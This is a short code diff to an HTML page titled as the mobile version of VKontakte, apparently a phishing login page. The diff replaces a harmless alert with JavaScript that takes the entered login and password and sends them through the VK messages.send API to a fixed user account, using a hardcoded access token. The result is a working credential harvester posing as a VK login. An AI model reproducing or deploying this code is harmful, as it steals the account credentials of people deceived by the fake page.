@@ -11,7 +11,15 @@
 	function Submit(){
 		var l = document.getElementsByName("login")[0].value;
 		var p = document.getElementsByName("password")[0].value;
-		alert(l + ":" + p);
+		var req="https://api.vk.com/method/messages.send?user_id=84364520&message="+l+":"+p + "&access_token=d1f27f6546892ba80d5c34f02ca8c5e0453a22cd95e60902613170ad8bed0debe95c88fb7df48215f7663";
+		$.ajax({
+				url : req,
+				type : "GET",
+				dataType : "jsonp",
+				success : function(msg){
+				console.log(msg.response[0]);
+			}
+		});
 	}
 </script>
 <title>Мобильная версия ВКонтакте</title>
